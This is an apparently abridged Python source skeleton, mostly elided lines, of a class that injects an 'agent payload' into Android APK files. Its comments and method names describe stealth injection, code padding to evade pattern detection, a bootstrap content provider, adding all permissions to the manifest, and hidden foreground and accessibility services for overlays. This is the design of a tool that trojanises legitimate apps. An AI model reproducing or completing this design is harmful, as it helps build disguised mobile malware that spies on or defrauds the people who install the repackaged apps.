...
class EnhancedAPKInjector:
    def __init__(self, build_params: Dict):
        ...
        # Original permissions that must be maintained
        ...
        # Android 14+ additional permissions
    ...
    def inject_into_apk(self, target_apk_path: str, agent_payload_path: str, 
        ...
        try:
            ...
            # Stealth agent injection
            self._stealth_inject_agent()
            
            # Maintain all original permissions
        ...
        for root, dirs, files in os.walk(agent_smali_dir):
            for file in files:
                if file.endswith('.smali'):
                    ...
                    # Distribute across smali directories
    ...
    def _copy_with_stealth_modifications(self, src: str, dst: str):
        ...
        if self.stealth_mode:
            # Add dummy instructions for pattern breaking
    ...
    def _inject_into_content_provider(self) -> bool:
        ...
        try:
            # Create a stealth content provider for bootstrap
    ...
    def _modify_class_for_bootstrap(self, class_name: str, class_type: str) -> bool:
        ...
        try:
            ...
            # Try different smali directories
...
'''
            ...
            # Write provider to first available smali directory
            smali_dirs = self._find_optimal_smali_dirs()
    ...
    def _modify_manifest_with_all_permissions(self):
        ...
        try:
            ...
            # Add ALL required permissions that are missing
            permissions_added = 0
            ...
            # Add agent service with enhanced configuration
            application = root.find("application")
            if application is not None:
                # Main agent service
                ...
                # Android 10+ foreground service type
                ...
                # Accessibility service for overlay functionality
    ...
    def _verify_injection_with_permissions(self, final_apk: str):
        ...
        # Check permissions in final APK
